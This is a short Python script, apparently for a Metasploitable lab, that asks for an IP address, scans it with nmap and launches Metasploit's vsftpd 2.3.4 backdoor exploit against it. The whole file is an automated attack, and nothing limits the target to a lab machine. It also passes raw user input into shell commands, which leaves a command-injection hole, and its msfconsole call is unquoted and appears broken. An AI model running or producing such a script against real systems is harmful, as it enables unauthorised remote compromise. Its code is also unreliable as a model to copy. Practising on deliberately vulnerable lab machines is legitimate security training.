import os , sys
import datetime
print("Automate metasploitble Hacking")
ip=input("Enter the ip address : ")
os.system(f"nmap {ip} | grep open > open.port")
versions=['unix/ftp/vsftpd_234_backdoor']

os.system(f"msfconsole -x use unix/ftp/vsftpd_234_backdoor ;set rhost {ip};run")


